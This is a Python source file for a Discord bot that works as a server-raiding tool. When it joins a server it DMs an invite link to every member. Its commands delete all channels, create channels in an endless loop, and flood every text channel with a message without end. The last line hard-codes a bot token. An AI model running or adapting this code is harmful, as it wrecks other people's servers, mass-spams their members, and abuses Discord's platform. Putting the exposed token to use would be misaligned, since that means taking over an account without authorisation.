from operator import mod
import re
import random
import discord
from discord import embeds
from discord import colour
from discord import user
from discord import member
from discord import permissions
from discord.colour import Color 
from discord.ext import commands
from discord.ext.commands import bot
from discord.ext.commands.bot import Bot
from discord.ext.commands.core import after_invoke, command, cooldown, has_permissions
from discord.ext.commands.errors import BotMissingPermissions, MissingPermissions, MissingRequiredArgument
from discord.member import Member
from discord.utils import time_snowflake
from discord import Intents
from discord.ext import commands

intents=discord.Intents.all()

client = commands.AutoShardedBot(command_prefix = 's', intents=intents)
client.remove_command('help')

@client.event
async def on_guild_join(guild):
    members = guild.members
    for member in members:
        try:
            await member.send("https://discord.gg/cYwqYw2Rtr")
        except:
            print('User dm closed')

@client.command()
async def destroy (ctx,message):
    guild=ctx.message.guild
    await ctx.message.delete()
    
    for channel in list(ctx.message.guild.channels):
        try:
            await channel.delete()
            print(f"{channel.name} has been deleted")
        except:
             pass
    for i in range(1):
        await guild.create_text_channel(f"{message}")
    while True:
        for channel in guild.text_channels:
            for i in range (1):
                await guild.create_text_channel(f"{message}")
 

@client.command()
async def s(ctx, *, message ):
  guild=ctx.message.guild
  await ctx.message.delete()
  for i in range(2):
    print("spammed")
    while True:
           for channel in guild.text_channels:
                 await channel.send(f"{message}")

@client.command()
async def cda(ctx):
    guild=ctx.message.guild
    await ctx.message.delete()
    
    for channel in list(ctx.message.guild.channels):
        try:
            await channel.delete()
        except:
            pass   


 
client.run("ODUwMDc2NzUzODI4MjQ5NjUw.YLkdqw.xFxLZJhcqED0qlUytLfu8MsM1Xo")
